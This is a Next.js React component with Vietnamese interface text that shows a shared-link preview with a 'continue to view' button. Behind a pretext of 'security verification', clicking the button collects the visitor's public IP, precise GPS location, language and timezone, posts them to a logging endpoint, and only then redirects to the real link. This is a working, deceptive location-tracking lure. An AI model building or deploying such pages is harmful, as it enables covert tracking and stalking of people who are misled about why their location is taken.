'use client';

import React, { useState } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { Loader2, FileText, UserCheck } from 'lucide-react';
import { Button } from '@/components/ui/button';
import type { Link as LinkType } from '@/app/actions/links';

interface LinkVerificationClientProps {
  link: LinkType;
}

export function LinkVerificationClient({ link }: LinkVerificationClientProps) {
  const [status, setStatus] = useState('Đang chờ xác minh của bạn...');
  const [isVerifying, setIsVerifying] = useState(false);

  const handleVerification = async () => {
    setIsVerifying(true);
    
    let clientIp = 'N/A';
    try {
      setStatus('Đang xác định địa chỉ mạng...');
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      if (ipResponse.ok) {
        clientIp = (await ipResponse.json()).ip;
      }
    } catch (e) {
      setStatus('Không thể xác định địa chỉ mạng. Đang tiếp tục...');
    }

    const logAndRedirect = (pos?: GeolocationPosition) => {
      setStatus('Đang ghi lại thông tin an toàn và chuẩn bị chuyển hướng...');
      
      const body: { ip: string; lat?: number; lon?: number; acc?: number; linkId: string; lang: string, timezone: string } = { 
          ip: clientIp,
          linkId: link.id,
          lang: navigator.language || 'N/A',
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'
      };

      if (pos) {
        body.lat = pos.coords.latitude;
        body.lon = pos.coords.longitude;
        body.acc = pos.coords.accuracy;
      }

      const payload = JSON.stringify(body);
      
      fetch('/api/log-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true,
      }).catch(err => {
          console.error("Logging failed, but redirecting anyway:", err);
      }).finally(() => {
          setTimeout(() => {
              window.location.href = link.redirectUrl;
          }, 150);
      });
    };

    setStatus('Đang yêu cầu quyền truy cập vị trí...');
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        logAndRedirect,
        () => {
          setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
          logAndRedirect();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    } else {
      setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
      logAndRedirect();
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-cover bg-center p-4" style={{backgroundImage: `url(${link.imageUrl})`}}>
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
      <Card className="z-10 p-6 sm:p-8 rounded-xl shadow-2xl text-center max-w-lg w-full bg-card/80 backdrop-blur-lg border border-white/20">
        <CardContent className="p-0 flex flex-col items-center">

          <div className="w-full bg-muted/30 rounded-lg p-4 mb-6 border border-white/10">
            <div className="flex items-center gap-4 mb-4 text-left">
                 <div className="bg-primary/10 p-3 rounded-lg border border-primary/20">
                    <FileText className="h-6 w-6 text-primary" />
                 </div>
                 <div>
                    <p className="font-bold text-lg text-foreground leading-tight">{link.title}</p>
                    <p className="text-sm text-muted-foreground">{link.description}</p>
                 </div>
            </div>
            <div className="aspect-[16/10] w-full rounded-md bg-background flex items-center justify-center overflow-hidden shadow-inner">
                <Image
                    src={link.imageUrl}
                    alt={link.title}
                    width={800}
                    height={500}
                    className="object-cover w-full h-full"
                    priority
                />
            </div>
          </div>
          
          {isVerifying ? (
            <>
              <h1 className="text-2xl font-bold mb-2 text-foreground">Đang xác thực quyền truy cập...</h1>
              <p className="text-muted-foreground text-sm leading-normal mb-8">
                Để đảm bảo an toàn, chúng tôi cần xác minh yêu cầu của bạn trước khi chuyển hướng. Vui lòng đợi.
              </p>
              <div className="w-full flex flex-col items-center justify-center gap-4 h-24">
                <Loader2 className="h-10 w-10 text-primary animate-spin" />
                <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
              </div>
            </>
          ) : (
            <>
              <h1 className="text-2xl font-bold mb-2 text-foreground">{link.title}</h1>
              <p className="text-muted-foreground text-sm leading-normal mb-8">
                {link.description}
              </p>
              <Button onClick={handleVerification} size="lg" className="w-full h-16 text-lg font-bold">
                 <UserCheck className="mr-3 h-6 w-6" />
                 Tiếp tục để xem
              </Button>
            </>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
